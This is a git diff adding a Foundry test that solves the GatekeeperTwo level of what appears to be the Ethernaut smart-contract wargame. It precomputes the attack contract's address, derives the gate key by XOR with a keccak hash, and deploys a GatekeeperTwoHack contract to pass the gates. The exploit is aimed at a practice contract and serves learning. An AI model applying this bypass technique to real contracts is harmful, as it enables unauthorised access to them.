@@ -64,6 +64,43 @@ contract GatekeeperTwoTest is Test {
         GatekeeperTwo instance = GatekeeperTwo(payable(instanceAddress));
 
         /* Level Hack */
+        address entrant = instance.entrant();
+        emit log_named_address("entrant", entrant);
+        assertEq(entrant, address(0));
+
+        // Solution comments in GatekeeperTwo.sol
+        uint256 nonce = vm.getNonce(address(eoa));
+        emit log_named_uint("nonce", nonce); // 0
+        address gatekeeperOneHackAddress = computeCreateAddress(eoa, nonce);
+        emit log_named_address(
+            "gatekeeperOneHackAddress",
+            gatekeeperOneHackAddress
+        );
+
+        bytes8 hashResult = bytes8(
+            keccak256(abi.encodePacked(gatekeeperOneHackAddress))
+        );
+        console.logBytes8(hashResult);
+
+        bytes8 _gateKey = bytes8(type(uint64).max - uint64(hashResult));
+        console.logBytes8(_gateKey);
+
+        // Assert all gate checks from GatekeeperTwo's gateThree
+        assertTrue(
+            uint64(
+                bytes8(keccak256(abi.encodePacked(gatekeeperOneHackAddress)))
+            ) ^
+                uint64(_gateKey) ==
+                type(uint64).max
+        );
+
+        GatekeeperTwoHack gatekeeperOneHack = new GatekeeperTwoHack(
+            instanceAddress
+        );
+
+        entrant = instance.entrant();
+        emit log_named_address("entrant", entrant);
+        assertEq(entrant, address(eoa));
 
         /* Level Submit */
         // Start recording logs to capture level completed log
